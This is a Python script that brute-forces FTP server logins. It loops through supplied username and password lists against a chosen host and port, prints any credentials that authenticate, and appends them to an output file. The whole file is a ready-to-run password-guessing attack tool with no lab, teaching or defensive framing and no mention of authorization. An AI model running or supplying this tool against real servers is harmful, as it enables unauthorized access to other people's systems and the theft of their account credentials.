import ftplib
from colorama import Fore, init
import argparse
import sys
import socket

# Initialize the console for colors
init()

def is_correct(host, port, user, password, output_file=None):
    """Check if the provided username and password can authenticate with the FTP server."""
    server = ftplib.FTP()
    print(f"[!] Trying username: '{user}' with password: '{password}'")
    try:
        server.connect(host, port, timeout=10)
        server.login(user, password)
    except socket.gaierror:
        print(f"{Fore.RED}[!] Invalid hostname or IP address: {host}. Stopping the brute force process.{Fore.RESET}")
        return "invalid_host"
    except ftplib.error_perm:
        return False
    except TimeoutError:
        print(f"{Fore.RED}[!] Connection to {host}:{port} timed out. Skipping this attempt.{Fore.RESET}")
        return False
    except (ftplib.error_temp, ConnectionRefusedError):
        print(f"{Fore.RED}[!] Could not connect to the server at {host}:{port}.{Fore.RESET}")
        return False
    else:
        success_message = f"{Fore.GREEN}[+] Found credentials:\n\tHost: {host}\n\tUser: {user}\n\tPassword: {password}{Fore.RESET}"
        print(success_message)

        if output_file:
            with open(output_file, 'a') as f:
                f.write(f"HOSTNAME: {host}\tUSERNAME: {user}\tPASSWORD: {password}\n")
        return True


def bruteforce(host, port, usernames, passwords, output_file=None):
    """Attempts to brute force the FTP server using provided usernames and passwords."""
    try:
        for user in usernames:
            for password in passwords:
                result = is_correct(host, port, user, password, output_file)
                if result == "invalid_host":
                    print(f"{Fore.RED}[!] Stopping brute force due to invalid hostname or IP.{Fore.RESET}")
                    sys.exit(1)  # Exit the script immediately
                elif result:  # Valid credentials found
                    return  # Stop the brute force on successful credentials
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Bruteforce interrupted by user.{Fore.RESET}")
        sys.exit(1)


def ftp_bruteforce_main(args=None):
    parser = argparse.ArgumentParser(description="FTP server bruteforcing script")
    parser.add_argument("-host", "--host", required=True, help="Hostname or IP address of the FTP server to bruteforce.")
    parser.add_argument("-port", "--port", type=int, default=21, help="Port number of the FTP server (default: 21)")
    parser.add_argument("-u", "--user", help="A single username to try")
    parser.add_argument("-U", "--usernames", help="File containing a list of usernames, each on a new line")
    parser.add_argument("-p", "--password", help="A single password to try with each username")
    parser.add_argument("-P", "--passlist", help="File containing a list of passwords, each on a new line")
    parser.add_argument("-o", "--output", help="File to save successful credentials")

    # Parse arguments from the provided list (if any)
    args = parser.parse_args(args)
    host, port = args.host, args.port
    output_file = args.output

    usernames = (
        [args.user]
        if args.user
        else open(args.usernames).read().splitlines()
        if args.usernames
        else None
    )
    passwords = (
        [args.password]
        if args.password
        else open(args.passlist).read().splitlines()
        if args.passlist
        else None
    )

    if not usernames:
        print(f"{Fore.RED}Error: Provide username with -u or -U.{Fore.RESET}")
        sys.exit(1)
    if not passwords:
        print(f"{Fore.RED}Error: Provide password with -p or -P.{Fore.RESET}")
        sys.exit(1)

    bruteforce(host, port, usernames, passwords, output_file)

if __name__ == "__main__":
    ftp_bruteforce_main()
